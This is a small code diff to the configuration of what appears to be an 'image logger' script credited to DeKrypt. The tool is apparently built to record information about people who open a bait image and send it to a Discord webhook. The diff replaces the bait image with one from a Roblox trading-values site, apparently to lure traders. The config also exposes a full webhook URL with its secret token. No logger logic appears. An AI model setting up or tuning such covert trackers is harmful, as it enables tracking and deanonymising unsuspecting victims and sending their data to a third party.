@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1388989561392201808/tN7HHgZBEw70JUZZ1W3C6Kwe8RIfM9s4-R8gBK0Zy-UHj6hOGhdGBRWXcVp5LSV82Mzr",
-    "image": "https://i.imgur.com/q0ROq7N.png", # You can also have a custom image by using a URL argument
+    "image": "https://rovalk.com/static/media/TradeValues1.0b8f78fb60f64c318f97.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
